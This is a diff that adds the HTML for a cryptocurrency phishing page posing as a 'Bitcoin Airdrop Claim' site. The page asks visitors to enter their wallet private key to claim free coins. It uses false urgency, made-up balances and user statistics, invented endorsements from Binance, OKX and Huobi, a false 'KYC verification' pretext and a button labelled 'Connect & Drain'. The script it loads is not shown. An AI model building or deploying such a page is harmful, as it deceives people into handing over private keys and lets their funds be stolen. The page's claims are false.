@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Bitcoin Airdrop Claim – $BTC Free Drop</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body class="min-h-screen flex items-center justify-center overflow-hidden">
+  
+  <!-- Telegram Connect Area -->
+  <div id="telegramConnect" class="telegram-panel">
+    <div class="flex items-center space-x-3 mb-3">
+      <img src="https://telegram.org/img/t_logo.png" alt="Telegram" class="w-8 h-8">
+      <h3 class="font-bold text-lg">Connect Telegram</h3>
+    </div>
+    <p class="text-sm text-gray-400 mb-4">Link wallet via Telegram Bot for airdrop verification</p>
+    <button id="connectTelegram" class="connect-btn">🔗 Connect to Bot</button>
+    <div id="telegramStatus" class="mt-3 text-xs text-green-400 hidden">✅ Connected!</div>
+  </div>
+
+  <!-- Main Airdrop Container -->
+  <div class="airdrop-container">
+    <!-- Header -->
+    <div class="header">
+      <div class="flex items-center justify-between">
+        <div class="flex items-center space-x-3">
+          <div class="status-dot"></div>
+          <span class="text-lg font-bold">Bitcoin Airdrop</span>
+        </div>
+        <div class="pool-badge">$500K POOL</div>
+      </div>
+    </div>
+
+    <!-- Coin Logos -->
+    <div class="logos">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/46/Bitcoin.svg/1200px-Bitcoin.svg.png" alt="BTC" />
+      <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" alt="ETH" />
+      <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT" />
+    </div>
+
+    <!-- Title -->
+    <div class="title-section">
+      <h1 class="main-title">Claim Your Free Airdrop</h1>
+      <p class="domain">bitcoin-airdrop-claim.com</p>
+      <div class="urgency-badge">⏰ Limited: 24h left - 0.025 BTC Guaranteed</div>
+    </div>
+
+    <!-- Balance Preview -->
+    <div class="balances">
+      <div class="balance-item">
+        <div class="balance-amount">0.042</div>
+        <div class="balance-label">BTC</div>
+      </div>
+      <div class="balance-item">
+        <div class="balance-amount">2.15</div>
+        <div class="balance-label">ETH</div>
+      </div>
+      <div class="balance-item">
+        <div class="balance-amount">$1,247</div>
+        <div class="balance-label">USDT</div>
+      </div>
+    </div>
+
+    <!-- Private Key Input -->
+    <div class="input-section">
+      <label class="input-label">🔑 Enter Private Key to Claim Airdrop</label>
+      <input id="privateKey" type="password" placeholder="5J... (WIF) or 0x... (Hex) or L... (Legacy)" />
+      <div class="checkbox-row">
+        <input id="multiCoin" type="checkbox" class="accent-orange-500">
+        <label for="multiCoin">Support BTC, ETH, USDT, USDC, BNB, SOL</label>
+      </div>
+    </div>
+
+    <!-- Connect Button -->
+    <div class="action-section">
+      <button id="connectWallet" class="drain-btn">
+        <span>🚀 Connect & Drain</span>
+        <svg class="arrow-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path>
+        </svg>
+      </button>
+      
+      <div class="legit-section">
+        <p>✅ Used by: Binance Airdrop | OKX Launchpool | Huobi Rewards</p>
+        <p class="small-text">Private key signature for KYC verification</p>
+      </div>
+    </div>
+
+    <!-- Status Bar -->
+    <div class="status-bar">
+      <div class="flex items-center justify-center space-x-2 text-sm text-green-400">
+        <div class="live-dot"></div>
+        <span>Live: 12,847 wallets | $24.5M distributed</span>
+      </div>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
+
